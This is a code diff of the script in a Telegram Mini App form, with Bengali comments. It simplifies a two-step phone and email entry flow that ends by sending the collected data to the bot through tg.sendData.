-    // স্টেপ পরিবর্তন লজিক
+    // 🔄 স্টেপ পরিবর্তন
     function goToStep(nextStep) {
-        let currentLower = currentStepName.toLowerCase();
-        document.getElementById(currentLower + 'Spinner').style.display = 'block';
-        document.getElementById(currentLower + 'BtnText').style.display = 'none';
-        document.getElementById(currentLower + 'ProceedBtn').setAttribute('disabled', 'true');
-
-        setTimeout(() => {
-            if (currentStepName === "Phone") {
-                const cc = document.getElementById('ccInput').value.trim();
-                const mainNum = document.getElementById('mainNumberInput').value.trim();
-                collectedFormData.phone = "+" + cc + mainNum;
-            }
-            if (currentStepName === "Email") {
-                const emailVal = document.getElementById('emailInput').value.trim();
-                collectedFormData.email = emailVal;
-                collectedFormData.gmail = emailVal; 
-            }
-
-            document.getElementById('step' + currentStepName).style.display = 'none';
-            document.getElementById('step' + nextStep).style.display = 'block';
-            document.getElementById('backArrowBtn').style.display = 'flex';
+        if (nextStep === "Email") {
+            collectedFormData.phone = "+" + document.getElementById('ccInput').value + document.getElementById('mainNumberInput').value;
+            document.getElementById('stepPhone').style.display = 'none';
+            document.getElementById('stepEmail').classList.add('active');
+        } 
+        else if (nextStep === "Summary") {
+            collectedFormData.email = document.getElementById('emailInput').value.trim();
+            collectedFormData.gmail = collectedFormData.email;
             
-            currentStepName = nextStep;
+            document.getElementById('sumPhone').innerText = collectedFormData.phone;
+            document.getElementById('sumEmail').innerText = collectedFormData.email;
 
-            if (nextStep === "Summary") {
-                document.getElementById('brandHeader').style.display = 'none';
-                document.getElementById('sumPhone').innerText = collectedFormData.phone;
-                document.getElementById('sumEmail').innerText = collectedFormData.email;
-            }
-        }, 400);
-    }
-
-    // ব্যাক বাটন হ্যান্ডলার
-    function handleBack() {
-        document.getElementById('brandHeader').style.display = 'flex';
-        
-        if (currentStepName === "Summary") {
-            document.getElementById('stepSummary').style.display = 'none';
-            document.getElementById('stepEmail').style.display = 'block';
-            resetSpinner('email'); currentStepName = "Email";
-        } else if (currentStepName === "Email") {
+            document.getElementById('stepEmail').classList.remove('active');
             document.getElementById('stepEmail').style.display = 'none';
-            document.getElementById('stepPhone').style.display = 'block';
-            document.getElementById('backArrowBtn').style.display = 'none';
-            resetSpinner('phone'); currentStepName = "Phone";
-            checkPhoneLive();
+            document.getElementById('stepSummary').classList.add('active');
         }
     }
 
-    function resetSpinner(prefix) {
-        document.getElementById(prefix + 'Spinner').style.display = 'none';
-        document.getElementById(prefix + 'BtnText').style.display = 'block';
-        document.getElementById(prefix + 'ProceedBtn').removeAttribute('disabled');
-        document.getElementById(prefix + 'ProceedBtn').classList.add('active');
-    }
-
-    // ফাইনাল ডাটা সাবমিট
+    // 🚀 সাবমিট ডাটা
     function submitFinalData() {
         document.getElementById('submitSpinner').style.display = 'block';
         document.getElementById('submitBtnText').style.display = 'none';
-        document.getElementById('submitBtn').setAttribute('disabled', 'true');
-        document.getElementById('successOverlay').style.display = 'flex';
-
+        
         setTimeout(() => {
             tg.sendData(JSON.stringify(collectedFormData));
-            setTimeout(() => {
-                tg.close();
-            }, 1000);
-        }, 1500);
+            tg.close();
+        }, 1000);
     }
-
-    // পেজ লোড হবার পর প্রাথমিক ভ্যালিডেশন ট্র্রিগার
-    document.addEventListener("DOMContentLoaded", function() {
-        checkPhoneLive();
-    });
 </script>
 </body>
 </html>
